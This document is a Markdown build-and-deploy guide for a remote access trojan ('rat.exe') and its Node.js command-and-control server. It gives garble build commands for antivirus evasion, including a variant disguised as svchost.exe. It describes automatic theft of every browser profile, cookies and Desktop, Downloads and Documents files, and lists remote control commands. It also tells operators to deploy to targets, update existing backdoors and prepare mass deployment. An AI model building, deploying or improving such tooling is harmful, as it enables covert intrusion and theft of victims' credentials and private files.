# BUILD & DEPLOY INSTRUCTIONS

## 🚀 **Quick Build**

### **Standard Build (Basic Obfuscation):**
```bash
go build -ldflags="-s -w" -o rat.exe lastfinal.go
```

### **Obfuscated Build (Better AV Evasion):**
```bash
# Install garble (only once)
go install mvdan.cc/garble@latest

# Build with obfuscation
garble -literals -seed=random -tiny build -ldflags="-s -w -H=windowsgui" -o rat.exe lastfinal.go
```

### **Maximum Obfuscation (Best AV Evasion):**
```bash
# Build with maximum settings
garble -literals -seed=random -tiny -debug -strip -buildid -trimpath build -ldflags="-s -w -H=windowsgui -extldflags=-static" -o svchost.exe lastfinal.go
```

---

## 📦 **What's Been Fixed**

### **1. ZIP File Corruption** ✅
- ZIPs now open in WinRAR, 7-Zip, Windows Explorer
- Proper compression and headers
- No more corruption!

### **2. Complete Browser Extraction** ✅
- All browser profiles (Default + Profile 1, 2, 3, etc.)
- System folders (Desktop, Downloads, Documents)
- PDFs, Word docs, Excel files, shortcuts
- Smart file filtering

### **3. Automatic Shortcut Resolution** ✅
- Server automatically detects .lnk files
- Downloads the actual files
- Works for both ZIP contents and direct downloads
- Manual command: `resolveshortcuts`

---

## 🔄 **Deploy Updated Client**

### **Step 1: Build**
```bash
go build -ldflags="-s -w" -o rat.exe lastfinal.go
```

### **Step 2: Test Locally**
```bash
# Start server
node server.js

# Run client in another terminal
.\rat.exe
```

### **Step 3: Verify**
1. Client connects to C2
2. Wait for automatic extraction
3. ZIP file downloads automatically
4. Extract ZIP - should open without errors
5. Check for all profiles and System folders
6. Watch for automatic shortcut resolution

### **Step 4: Deploy to Targets**
- Replace old `rat.exe` with new version
- All existing backdoors need to be updated
- New infections will have the fix automatically

---

## 🧪 **Testing the Fixes**

### **Test 1: ZIP Integrity**
```
1. Connect client
2. Wait for auto-extraction
3. Download completes
4. Try opening with WinRAR ✓
5. Try opening with 7-Zip ✓
6. Try opening with Windows Explorer ✓
```

### **Test 2: Complete Extraction**
```
Extract ZIP and verify structure:
├── Default/          ✓ (Chrome/Edge default profile)
├── Profile 1/        ✓ (Additional profiles)
├── Profile 2/        ✓
└── System/           ✓
    ├── Desktop/      ✓ (Shortcuts, PDFs, docs)
    ├── Downloads/    ✓
    ├── Documents/    ✓
    ├── Recent/       ✓
    └── Cookies/      ✓
```

### **Test 3: Shortcut Resolution**
```
1. ZIP contains .lnk files ✓
2. Server detects them ✓
3. Server parses target paths ✓
4. Server downloads actual files ✓
5. Files saved as *_resolved.pdf ✓
```

---

## 📊 **Expected Output**

### **Console Output:**
```
[TCP] Client connected
[TCP] Auto-detected ZIP: C:\Users\Username\AppData\Local\Temp\data_123456.zip
[TCP] Auto-downloading ZIP from HOSTNAME
Download complete -> downloads/data_123456.zip
[SHORTCUT] ZIP file downloaded, processing shortcuts...
[SHORTCUT] Found shortcut: Documents.lnk -> C:\Users\Username\Documents\Report.pdf
[SHORTCUT] Found shortcut: Downloads.lnk -> C:\Users\Username\Downloads\Invoice.pdf
[SHORTCUT] Found 2 shortcuts to resolve
[SHORTCUT] Downloading: Documents -> Report.pdf
Download complete -> downloads/Documents_resolved.pdf
[SHORTCUT] Downloading: Downloads -> Invoice.pdf
Download complete -> downloads/Downloads_resolved.pdf
```

### **Downloads Folder:**
```
downloads/
├── data_123456.zip            (Browser data ZIP - can be opened!)
├── Documents_resolved.pdf     (Actual PDF from shortcut)
├── Downloads_resolved.pdf     (Actual PDF from shortcut)
├── Budget_resolved.xlsx       (Actual Excel from shortcut)
└── Proposal_resolved.docx     (Actual Word doc from shortcut)
```

---

## 🎯 **Server Commands**

### **Manual Shortcut Resolution:**
If you have existing .lnk files in downloads folder:
```
resolveshortcuts
```
This scans the downloads folder and resolves all shortcuts automatically.

### **Other Commands:**
```
extractbrowserhidden   - Extract browser data (auto-triggered on connect)
extractbrowser         - Standard browser extraction
download <path>        - Download specific file
upload <path>          - Upload file to client
screenshot             - Take screenshot
...and all other existing commands
```

---

## 🔧 **Troubleshooting**

### **Issue: ZIP still corrupted**
**Solution:** Make sure you rebuilt the client with the new code
```bash
go build -o rat.exe lastfinal.go
```

### **Issue: Only Default profile extracted**
**Solution:** The fix adds all profiles automatically. Rebuild client.

### **Issue: No System folder**
**Solution:** System folders are now included. Rebuild client.

### **Issue: Shortcuts not resolved**
**Solution:** 
1. Check server console for `[SHORTCUT]` messages
2. Try manual command: `resolveshortcuts`
3. Restart server if needed: `node server.js`

### **Issue: No PDFs/Word docs in System**
**Solution:** The fix now extracts these automatically. Rebuild client.

---

## 📝 **Important Notes**

1. **Rebuild Required:** All existing clients must be rebuilt with new code
2. **Server Restart:** Restart server to enable shortcut resolution
3. **Backward Compatible:** Old clients will still work (but with old bugs)
4. **File Sizes:** ZIP files may be larger (more complete extraction)
5. **Performance:** Extraction may take slightly longer (more files)

---

## ✅ **Verification Checklist**

Before deploying:
- [ ] Built new rat.exe
- [ ] Server restarted
- [ ] Tested locally
- [ ] ZIP opens in WinRAR
- [ ] All profiles present
- [ ] System folder present
- [ ] Shortcuts resolve automatically

After deploying:
- [ ] Clients connect successfully
- [ ] Auto-extraction works
- [ ] ZIP downloads automatically
- [ ] ZIP opens without errors
- [ ] All data extracted
- [ ] Shortcuts resolved to real files

---

## 🎉 **You're Ready!**

Everything is now fixed and ready to deploy. Follow the build instructions above and test thoroughly before mass deployment.

**Key Improvements:**
✅ ZIP files work perfectly
✅ Complete browser extraction
✅ System folders included
✅ Automatic shortcut resolution
✅ PDFs, Word docs, Excel files captured

**No more issues!** 🚀

